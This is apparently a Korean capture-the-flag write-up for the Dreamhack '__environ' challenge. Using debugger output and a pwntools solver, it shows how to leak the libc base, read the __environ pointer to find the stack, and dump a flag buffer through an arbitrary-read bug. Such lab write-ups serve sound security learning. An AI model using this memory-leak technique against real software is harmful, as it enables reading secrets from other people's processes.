# ✏️ __environ
https://dreamhack.io/wargame/challenges/363/

## 📄 Vulnerability & Code Analysis
프로세스는 환경 변수 정보를 저장하고 필요할 때마다 불러와 사용
환경 변수 = 매번 변할 수 있는 동적인 값들의 모임, 시스템의 정보를 갖고 있는 변수
사용자가 직접 추가 및 수정하거나 삭제할 수 없음

리눅스에서 제공하는 명령어들은 `/bin`, `/usr/bin`등의 디렉터리에 위치
명령어 입력 시 환경 변수에 명시된 디렉터리에서 명령어를 탐색하고 실행하기 때문에 명령어의 경로를 직접 입력 X
터미널 뿐만 아니라 프로그램에서도 프로세스를 로드하면서 환경 변수 초기화
환경 변수에 대한 정보는 `STACK` 영역에 존재
라이브러리 함수를 실행할 때 해당 정보를 참조하기 때문에 환경 변수를 가리키는 포인터 별도 선언
```bash
(.venv) (base) ➜  __environ readelf -s ./libc.so.6 | grep "environ"
   133: 0000000000221200     8 OBJECT  WEAK   DEFAULT   35 _environ@@GLIBC_2.2.5
   958: 0000000000221200     8 OBJECT  WEAK   DEFAULT   35 environ@@GLIBC_2.2.5
```
gdb를 이용해서 `__environ` 포인터의 주소를 확인하고 해당 주소가 가리키는 영역을 `vmmap`으로 확인해보면STACK영역임을 알 수 있음

```bash
pwndbg> x/gx & __environ
0x7ffff7ffe2d0 <environ>:       0x00007fffffffd958
pwndbg> vmmap 0x00007fffffffd958
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
►     0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack] +0x20958
```
문제에서 주어진 소스코드는 다음과 같음
```c
// Name: environ.c
// Compile: gcc -o environ environ.c

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void sig_handle() {
  exit(0);
}
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  signal(SIGALRM, sig_handle);
  alarm(5);
}

void read_file() {
  char file_buf[4096];

  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}
```
`checksec`으로 보호 기법을 확인하면
```bash
(.venv) (base) ➜  __environ checksec ./environ
[*] '/home/daniel/dreamhack/pwn/__environ/environ'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
`./flag`의 내용을 읽고 스택 버퍼에 저장하고 메인에서는 `stdout`라이브러리 주소를 출력
`임의 주소 읽기` 공격이 가능함

## 🗡️ Exploit / Solver Strategy
### 1. __envrion 포인터의 주소 찾기
`libc_base`의 주소를 구하고 `__environ`의 offset을 더해 실제 주소를 찾는다.
```python
from pwn import *
p = process('./environ')
e = ELF('./libc.so.6')

p.recvuntil(b": ")
stdout = int(p.recvuntil(b"\n"), 16)
libc_base = stdout - e.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + e.symbols['__environ']

print(f"libc_base: {hex(libc_base)}")
print(f"libc_environ: {hex(libc_environ)}")

p.interactive()
```
```bash
(.venv) (base) ➜  __environ pypwn __environ.py
[+] Starting local process './environ': pid 72293
[*] '/home/daniel/dreamhack/pwn/__environ/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
libc_base: 0x7c7a949e9e40
libc_environ: 0x7c7a94c0b040
[*] Switching to interactive mode
> $
```
따라서 `__environ`의 실제 주소는 `0x7c7a94c0b040`임을 알아 냈다.

### 2. 스택 주소 계산
이제 `__envrion`안에 있는 스택의 주소를 계산한다.
```bash
pwndbg> disass read_file
Dump of assembler code for function read_file:
   0x00000000000012e0 <+0>:     endbr64
   0x00000000000012e4 <+4>:     push   rbp
   0x00000000000012e5 <+5>:     mov    rbp,rsp
   0x00000000000012e8 <+8>:     sub    rsp,0x1000
   0x00000000000012ef <+15>:    or     QWORD PTR [rsp],0x0
   0x00000000000012f4 <+20>:    sub    rsp,0x20
   0x00000000000012f8 <+24>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001301 <+33>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001305 <+37>:    xor    eax,eax
   0x0000000000001307 <+39>:    mov    esi,0x0
   0x000000000000130c <+44>:    lea    rax,[rip+0xcf1]        # 0x2004
   0x0000000000001313 <+51>:    mov    rdi,rax
   0x0000000000001316 <+54>:    mov    eax,0x0
   0x000000000000131b <+59>:    call   0x1150 <open@plt>
   0x0000000000001320 <+64>:    mov    DWORD PTR [rbp-0x1014],eax
   0x0000000000001326 <+70>:    lea    rcx,[rbp-0x1010]
   0x000000000000132d <+77>:    mov    eax,DWORD PTR [rbp-0x1014]
   0x0000000000001333 <+83>:    mov    edx,0xfff
   0x0000000000001338 <+88>:    mov    rsi,rcx
   0x000000000000133b <+91>:    mov    edi,eax
   0x000000000000133d <+93>:    call   0x1120 <read@plt>
   0x0000000000001342 <+98>:    mov    eax,DWORD PTR [rbp-0x1014]
   0x0000000000001348 <+104>:   mov    edi,eax
   0x000000000000134a <+106>:   call   0x1110 <close@plt>
   0x000000000000134f <+111>:   nop
   0x0000000000001350 <+112>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001354 <+116>:   sub    rax,QWORD PTR fs:0x28
   0x000000000000135d <+125>:   je     0x1364 <read_file+132>
   0x000000000000135f <+127>:   call   0x10e0 <__stack_chk_fail@plt>
   0x0000000000001364 <+132>:   leave
   0x0000000000001365 <+133>:   ret
End of assembler dump.
pwndbg> b *read_file+93
Breakpoint 1 at 0x133d
pwndbg> r
Starting program: /home/daniel/dreamhack/pwn/__environ/environ
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x000055555555533d in read_file ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────[ LAST SIGNAL ]──────────────────────────────────────────
Breakpoint hit at 0x55555555533d
──────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────
 RAX  3
 RBX  0x7fffffffd8f8 —▸ 0x7fffffffdc3e ◂— '/home/daniel/dreamhack/pwn/__environ/environ'
 RCX  0x7fffffffc390 ◂— 0x205000
 RDX  0xfff
 RDI  3
 RSI  0x7fffffffc390 ◂— 0x205000
 R8   0x7fffffffd2f0 ◂— 0
 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x555555557d78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555220 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffd3a0 —▸ 0x7fffffffd7d0 —▸ 0x7fffffffd870 —▸ 0x7fffffffd8d0 ◂— 0
 RSP  0x7fffffffc380 ◂— 1
 RIP  0x55555555533d (read_file+93) ◂— call read@plt
───────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────
b► 0x55555555533d <read_file+93>     call   read@plt                    <read@plt>
        fd: 3 (/home/daniel/dreamhack/pwn/__environ/flag)
        buf: 0x7fffffffc390 ◂— 0x205000
        nbytes: 0xfff

   0x555555555342 <read_file+98>     mov    eax, dword ptr [rbp - 0x1014]
   0x555555555348 <read_file+104>    mov    edi, eax
   0x55555555534a <read_file+106>    call   close@plt                   <close@plt>

   0x55555555534f <read_file+111>    nop
   0x555555555350 <read_file+112>    mov    rax, qword ptr [rbp - 8]
   0x555555555354 <read_file+116>    sub    rax, qword ptr fs:[0x28]
   0x55555555535d <read_file+125>  ? je     read_file+132               <read_file+132>

   0x55555555535f <read_file+127>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>

   0x555555555364 <read_file+132>    leave
   0x555555555365 <read_file+133>    ret
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ rsp     0x7fffffffc380 ◂— 1
01:0008│         0x7fffffffc388 ◂— 0x3001ff000
02:0010│ rcx rsi 0x7fffffffc390 ◂— 0x205000
03:0018│         0x7fffffffc398 ◂— 0x2046c8
04:0020│         0x7fffffffc3a0 ◂— 0x211d90
05:0028│-ff8     0x7fffffffc3a8 ◂— 0x1000
06:0030│-ff0     0x7fffffffc3b0 ◂— 0x1fe000
07:0038│-fe8     0x7fffffffc3b8 ◂— 3
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► 0   0x55555555533d read_file+93
   1   0x555555555398 main+50
   2   0x7ffff7c2a1ca __libc_start_call_main+122
   3   0x7ffff7c2a28b __libc_start_main+139
   4   0x5555555551a5 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/gx $rcx
0x7fffffffc390: 0x0000000000205000
pwndbg> p/x __environ
$1 = 0x7fffffffd908
```
### 3. 파일 내용 읽기
두 주소의 간격이 `0x1568`이므로 해당 주소의 내용을 출력하는 코드를 작성
```python
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b'\x00'))
file_content = stack_environ - 0x1568
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(file_content).encode())
```

## 💻 Final Payload or Solver
```python
from pwn import *
p = process('./environ')
e = ELF('./libc.so.6')

p.recvuntil(b": ")
stdout = int(p.recvuntil(b"\n"), 16)
libc_base = stdout - e.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + e.symbols['__environ']

print(f"libc_base: {hex(libc_base)}")
print(f"libc_environ: {hex(libc_environ)}")

p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b'\x00'))
file_content = stack_environ - 0x1568
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(file_content).encode())

p.interactive()
```

## 🏳️ cat flag
```bash
(.venv) (base) ➜  __environ pypwn __environ.py
[+] Opening connection to host3.dreamhack.games on port 14946: Done
[*] '/home/daniel/dreamhack/pwn/__environ/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
libc_base: 0x7f5ca924b000
libc_environ: 0x7f5ca946c200
[*] Switching to interactive mode
 DH{<FLAG_REDACTED>}
> [*]
```
  
